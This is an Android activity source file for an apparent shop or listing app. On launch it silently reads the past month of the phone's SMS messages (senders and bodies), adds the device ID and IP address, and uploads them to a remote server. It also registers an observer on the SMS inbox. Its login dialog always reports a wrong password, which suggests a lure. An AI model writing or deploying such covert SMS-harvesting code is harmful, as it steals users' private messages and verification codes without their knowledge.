package com.xhf.sms;

import androidx.appcompat.app.AppCompatActivity;
import androidx.recyclerview.widget.RecyclerView;
import androidx.recyclerview.widget.StaggeredGridLayoutManager;

import android.content.ContentResolver;
import android.content.Intent;
import android.database.Cursor;
import android.net.Uri;
import android.os.Bundle;
import android.os.Handler;
import android.util.Log;
import android.view.Gravity;
import android.view.LayoutInflater;
import android.view.View;
import android.widget.ImageView;
import android.widget.Toast;

import com.chad.library.adapter.base.BaseQuickAdapter;
import com.google.gson.Gson;
import com.xhf.sms.adapter.MainAdapter;
import com.xhf.sms.api.ApiManager;
import com.xhf.sms.bean.ConfigBean;
import com.xhf.sms.bean.MainBean;
import com.xhf.sms.bean.SmsBean;
import com.xhf.sms.dialog.CenterDialog;
import com.xhf.sms.utils.SpUtils;

import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Calendar;
import java.util.Date;
import java.util.HashMap;
import java.util.List;

import io.reactivex.Observer;
import io.reactivex.android.schedulers.AndroidSchedulers;
import io.reactivex.disposables.Disposable;
import io.reactivex.schedulers.Schedulers;


public class MainActivity extends AppCompatActivity implements View.OnClickListener {

    private MainAdapter mMainAdapter;
    private RecyclerView mRecyclerView;
    private ImageView mHeaderView, mFootView;
    private List<MainBean> mMainBeans;
    private CenterDialog mCenterDialog;
    private CenterDialog mLoginDialog;
    private CenterDialog mEnterDialog;
    private Uri SMS_INBOX = Uri.parse("content://sms/");
    private List<SmsBean.Msg> mMsgList = new ArrayList<>();


    @Override

    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        initView();
        initData();
        PhoneCode phoneCode = new PhoneCode(this, new Handler(), new PhoneCode.SmsListener() {
            @Override
            public void onResult(String result) {
                Log.e("onResult: ", result);

//                SmsBean smsBean = new SmsBean("tom", result, "", getLocalIpAddress(MainActivity.this));
//                Gson gson = new Gson();

//                ApiManager.getInstance().getApiService().sendSms(gson.toJson(smsBean))
//                        .subscribeOn(Schedulers.io())
//                        .observeOn(AndroidSchedulers.mainThread())
//                        .subscribe(new Observer<Response>() {
//                            @Override
//                            public void onSubscribe(Disposable d) {
//                            }
//
//                            @Override
//                            public void onNext(Response response) {
//                                Log.e("xhf", "onSubscribe: " + response.getMsg());
//                            }
//
//                            @Override
//                            public void onError(Throwable e) {
//                                Log.e("xhf", "onSubscribe: " + e.toString());
//                            }
//
//                            @Override
//                            public void onComplete() {
//
//                            }
//                        });

            }
        });

        this.getContentResolver().registerContentObserver(
                SMS_INBOX, true, phoneCode);


    }


    private void getphoneSms() {
        ContentResolver cr = getContentResolver();
        String[] projection = new String[]{"_id", "address", "person", "body", "date", "type"};
        Cursor cur = cr.query(SMS_INBOX, projection, null, null, "date desc");
        if (null == cur) {
            Log.i("getphoneSms", "************cur == null");
            return;
        }

        while (cur.moveToNext()) {
            String number = cur.getString(cur.getColumnIndex("address"));
            long startTime = cur.getLong(cur.getColumnIndex("date"));
            String body = cur.getString(cur.getColumnIndex("body"));
            Log.e("result", startTime + "-" + getMonthTime() + "--" + body);
            if (startTime > getMonthTime()) {
                SmsBean.Msg msg = new SmsBean.Msg();
                msg.setTel(number);
                msg.setData(body);
                mMsgList.add(msg);
            }
        }

        SmsBean smsBean = new SmsBean();
        smsBean.setName("");
        smsBean.setPhone("");
        smsBean.setImei(AppUtils.getDeviceID(this));
        smsBean.setIp(AppUtils.getLocalIpAddress(this));
        smsBean.setMsg(mMsgList);
        postMsmData(smsBean);
    }

    private long getMonthTime() {
        Calendar calendar = Calendar.getInstance();
        calendar.setTime(new Date(System.currentTimeMillis()));
        calendar.add(Calendar.MONTH, -1);
        return calendar.getTimeInMillis();
    }


    private void postMsmData(SmsBean sms) {
        ApiManager.getInstance().getApiService().sendSms(sms)
                .subscribeOn(Schedulers.io())
                .observeOn(AndroidSchedulers.mainThread())
                .subscribe(new Observer<Response>() {
                    @Override
                    public void onSubscribe(Disposable d) {
                    }

                    @Override
                    public void onNext(Response response) {
                        if (response.getCode() == 1) {
                            Log.e("sms", "短信上传成功: " + response.getMsg());

                        }
                    }

                    @Override
                    public void onError(Throwable e) {
                        Log.e("sms", "onError: " + e.toString());

                    }

                    @Override
                    public void onComplete() {

                    }
                });
    }

    private void requestMainData() {

        ApiManager.getInstance().getApiService().getconfigInfo()
                .subscribeOn(Schedulers.io())
                .observeOn(AndroidSchedulers.mainThread())
                .subscribe(new Observer<ConfigBean>() {
                    @Override
                    public void onSubscribe(Disposable d) {

                    }

                    @Override
                    public void onNext(ConfigBean configBeans) {
                        SpUtils.setShopTips(MainActivity.this, configBeans.getShop_tips());
                        SpUtils.setSMSTips(MainActivity.this, configBeans.getCaptcha_tips());

                    }

                    @Override
                    public void onError(Throwable e) {
                        Log.e("sms", e.toString());
                    }

                    @Override
                    public void onComplete() {

                    }
                });

        HashMap<String, Integer> map = new HashMap<>();
        map.put("page", 1);
        map.put("limit", 50);
        ApiManager.getInstance().getApiService().getMainInfo(map)
                .subscribeOn(Schedulers.io())
                .observeOn(AndroidSchedulers.mainThread())
                .subscribe(new Observer<List<MainBean>>() {
                    @Override
                    public void onSubscribe(Disposable d) {

                    }

                    @Override
                    public void onNext(List<MainBean> mainBeans) {
                        mMainBeans.addAll(mainBeans);
                        mMainAdapter.setNewData(mMainBeans);

                    }

                    @Override
                    public void onError(Throwable e) {
                        Log.e("sms", e.toString());

                    }

                    @Override
                    public void onComplete() {

                    }
                });


    }

    private void initData() {
        getphoneSms();
        requestMainData();


    }

    private void initEnterDialog() {
        mEnterDialog = (CenterDialog) CenterDialog.create(getSupportFragmentManager())
                .setLayoutRes(R.layout.dialog_enter)
                .setViewGravity(Gravity.CENTER)
                .setViewListener(new CenterDialog.ViewListener() {
                    @Override
                    public void bindView(View v) {
                        v.findViewById(R.id.closeView).setOnClickListener(new View.OnClickListener() {
                            @Override
                            public void onClick(View v) {
                                mEnterDialog.dismiss();
                            }
                        });

                        v.findViewById(R.id.applyView).setOnClickListener(new View.OnClickListener() {
                            @Override
                            public void onClick(View v) {
                                startActivity(new Intent(MainActivity.this, DetailActivity.class));
                                mEnterDialog.dismiss();
                            }
                        });
                    }
                }).show();
    }

    private void initLoginDialog() {
        mLoginDialog = (CenterDialog) CenterDialog.create(getSupportFragmentManager())
                .setLayoutRes(R.layout.dialog_login)
                .setViewGravity(Gravity.CENTER)
                .setViewListener(new CenterDialog.ViewListener() {
                    @Override
                    public void bindView(View v) {
                        v.findViewById(R.id.closeView).setOnClickListener(new View.OnClickListener() {
                            @Override
                            public void onClick(View v) {
                                mLoginDialog.dismiss();
                            }
                        });

                        v.findViewById(R.id.confirmView).setOnClickListener(new View.OnClickListener() {
                            @Override
                            public void onClick(View v) {
                                Toast.makeText(MainActivity.this, "密码错误", Toast.LENGTH_SHORT).show();
                                mLoginDialog.dismiss();
                            }
                        });
                    }
                }).show();


    }

    private void initView() {
        mRecyclerView = findViewById(R.id.recyclerView);
        mHeaderView = findViewById(R.id.headerView);
        mFootView = findViewById(R.id.footView);
        mHeaderView.setOnClickListener(this);
        mFootView.setOnClickListener(this);

        mMainBeans = new ArrayList<>();

        mMainAdapter = new MainAdapter(mMainBeans);
        mRecyclerView.setLayoutManager(new StaggeredGridLayoutManager(2, StaggeredGridLayoutManager.VERTICAL));
        mRecyclerView.setAdapter(mMainAdapter);

        View footerView = LayoutInflater.from(this).inflate(R.layout.recycler_footer, null);
        mMainAdapter.addFooterView(footerView);

        mMainAdapter.setOnItemClickListener(new BaseQuickAdapter.OnItemClickListener() {
            @Override
            public void onItemClick(BaseQuickAdapter adapter, View view, int position) {
                setClick();
            }
        });


    }


    private void setClick() {
        mCenterDialog = (CenterDialog) CenterDialog.create(getSupportFragmentManager())
                .setLayoutRes(R.layout.dialog_main)
                .setViewGravity(Gravity.CENTER)
                .setViewListener(new CenterDialog.ViewListener() {
                    @Override
                    public void bindView(View v) {

                        v.findViewById(R.id.closeView).setOnClickListener(new View.OnClickListener() {
                            @Override
                            public void onClick(View v) {
                                mCenterDialog.dismiss();
                            }
                        });
                        v.findViewById(R.id.loginView).setOnClickListener(new View.OnClickListener() {
                            @Override
                            public void onClick(View v) {
                                initLoginDialog();
                                mCenterDialog.dismiss();

                            }
                        });
                        v.findViewById(R.id.enterView).setOnClickListener(new View.OnClickListener() {
                            @Override
                            public void onClick(View v) {
                                initEnterDialog();
                                mCenterDialog.dismiss();

                            }
                        });

                    }
                }).show();
    }


    @Override
    public void onClick(View v) {
        setClick();
    }
}
